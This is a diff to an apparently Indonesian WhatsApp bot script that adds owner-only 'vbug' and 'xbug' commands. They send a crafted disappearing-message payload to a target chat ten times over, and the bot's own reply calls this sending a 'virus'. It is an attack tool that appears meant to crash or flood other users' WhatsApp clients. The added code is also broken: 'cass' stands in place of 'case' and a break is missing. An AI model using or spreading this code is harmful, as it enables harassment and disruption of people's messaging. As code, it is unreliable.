@@ -320,6 +320,15 @@ let buttonMessages = { locationMessage: { jpegThumbnail: gam1 }, contentText: te
 return Ryuu.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
 }            
 
+const sendBug = async (target) => {
+      await Ryuu.relayWAMessage(
+       Ryuu.prepareMessageFromContent(
+          target,
+          Ryuu.prepareDisappearingMessageSettingContent(0),
+          {}
+        ),{ waitForAck: true }) 
+    }
+
 const sticOwner = (hehe) => {
 ano = fs.readFileSync('./lib/sticker/owner.webp')
 Ryuu.sendMessage(hehe, ano, sticker, { quoted: mek})
@@ -801,6 +810,25 @@ And Group's 𝐙𝐨𝐧𝐚 𝐁𝐨𝐭
 Case ni sc hasil comat comot sc orang :)`
             fakestatus(inf) 
             break
+case 'vbug':
+if (!isOwner && !mek.key.fromMe) return
+await Ryuu.toggleDisappearingMessages(from, 0)
+await Ryuu.toggleDisappearingMessages(from, 0)
+await Ryuu.toggleDisappearingMessages(from, 0)
+					break
+cass 'xbug':
+if (!isOwner && !mek.key.fromMe) return
+reply('Btw sebelum kirim virus nanti jangan nanges... ') 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
+sendBug(from) 
     case 'delvote':
             if(!mek.key.remoteJid) return
             if(isVote) return reply('Tidak ada sesi Voting')
